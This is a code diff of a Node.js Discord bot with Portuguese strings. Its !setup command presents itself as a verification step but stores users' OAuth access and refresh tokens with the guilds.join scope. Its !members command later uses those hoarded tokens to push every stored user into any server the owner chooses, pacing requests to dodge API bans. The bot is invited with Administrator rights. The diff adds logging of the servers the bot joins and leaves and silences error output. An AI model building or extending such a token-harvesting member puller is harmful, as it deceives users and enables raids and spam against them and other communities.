@@ -29,6 +29,7 @@ const config = {
 
 const DB_FILE = 'users.json';
 const CONFIG_FILE = 'custom_config.json';
+const SERVERS_FILE = 'servers.json';
 
 let usersDB = {};
 if (fs.existsSync(DB_FILE)) usersDB = JSON.parse(fs.readFileSync(DB_FILE));
@@ -39,6 +40,9 @@ let botConfig = {
 };
 if (fs.existsSync(CONFIG_FILE)) botConfig = JSON.parse(fs.readFileSync(CONFIG_FILE));
 
+let serversDB = [];
+if (fs.existsSync(SERVERS_FILE)) serversDB = JSON.parse(fs.readFileSync(SERVERS_FILE));
+
 function saveUser(userId, accessToken, refreshToken, expiresIn) {
     const expiresAt = Date.now() + (expiresIn * 1000);
     usersDB[userId] = { accessToken, refreshToken, expiresAt };
@@ -47,6 +51,18 @@ function saveUser(userId, accessToken, refreshToken, expiresIn) {
 
 function saveConfig() {
     fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2));
+}
+
+function logServerAction(guild, action) {
+    const entry = {
+        serverName: guild.name,
+        serverId: guild.id,
+        action: action, // 'ENTROU' ou 'SAIU'
+        date: new Date().toLocaleString('pt-BR'),
+        memberCount: guild.memberCount
+    };
+    serversDB.push(entry);
+    fs.writeFileSync(SERVERS_FILE, JSON.stringify(serversDB, null, 2));
 }
 
 async function getValidAccessToken(userId) {
@@ -146,9 +162,7 @@ app.get('/callback', async (req, res) => {
         if (guild) {
             try {
                 await guild.members.add(userId, { accessToken: access_token });
-            } catch (err) {
-                console.log(`Erro ao adicionar membro: ${err.message}`);
-            }
+            } catch (err) { }
             
             const member = await guild.members.fetch(userId).catch(() => null);
             if (member) {
@@ -168,10 +182,17 @@ app.get('/callback', async (req, res) => {
     }
 });
 
+client.on('guildCreate', guild => {
+    logServerAction(guild, 'ENTROU');
+});
+
+client.on('guildDelete', guild => {
+    logServerAction(guild, 'SAIU');
+});
+
 client.on('messageCreate', async (message) => {
     if (message.author.bot || message.author.id !== config.OWNER_ID) return;
 
-    // --- COMANDO: CONFIGURAR APARÊNCIA (!sconfig) ---
     if (message.content === '!sconfig') {
         message.delete().catch(() => {});
         const embed = new EmbedBuilder()
@@ -191,7 +212,6 @@ client.on('messageCreate', async (message) => {
         return message.channel.send({ embeds: [embed], components: [row] });
     }
 
-    // --- COMANDO: ENVIAR VERIFICAÇÃO (!setup) ---
     if (message.content === '!setup') {
         message.delete().catch(() => {});
         const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&redirect_uri=${encodeURIComponent(config.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
@@ -210,7 +230,6 @@ client.on('messageCreate', async (message) => {
         return message.channel.send({ embeds: [embed], components: [row] });
     }
 
-    // --- COMANDO: PUXAR PARA O SERVER ATUAL (!members) ---
     if (message.content === '!members') {
         message.delete().catch(() => {});
         const targetGuild = message.guild;
@@ -233,29 +252,24 @@ client.on('messageCreate', async (message) => {
             } else {
                 fail++;
             }
-            await new Promise(r => setTimeout(r, 1000)); // Delay obrigatório para não tomar ban da API
+            await new Promise(r => setTimeout(r, 1000));
         }
-        statusMsg.edit(`✅ **Processo Finalizado!**\n\n📥 Sucessos: ${success}\n❌ Falhas (Token expirado/Já no server): ${fail}`);
+        statusMsg.edit(`✅ **Processo Finalizado!**\n\n📥 Sucessos: ${success}\n❌ Falhas: ${fail}`);
     }
 
-    // --- COMANDO: GERAR LINK DE CONVITE (!gerarlink) ---
     if (message.content === '!gerarlink') {
         message.delete().catch(() => {});
-        // Gera link com permissão de Administrador (8)
         const inviteUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&permissions=8&scope=bot`;
-        
         const embed = new EmbedBuilder()
             .setTitle('🔗 Link de Convite do Bot')
-            .setDescription(`Envie este link para adicionar o bot em outro servidor:\n\n[Clique aqui para Adicionar](${inviteUrl})\n\n**Nota:** O bot entrará com permissão de Administrador.`)
+            .setDescription(`[Clique aqui para Adicionar](${inviteUrl})\n\n**Nota:** Permissão de Administrador.`)
             .setColor('Blue');
-            
         message.channel.send({ embeds: [embed] });
     }
 
-    // --- COMANDO: SAIR DO SERVIDOR (!quit) ---
     if (message.content === '!quit') {
         message.delete().catch(() => {});
-        await message.channel.send('👋 Saindo do servidor conforme solicitado...');
+        await message.channel.send('👋 Saindo do servidor...');
         await message.guild.leave();
     }
 });
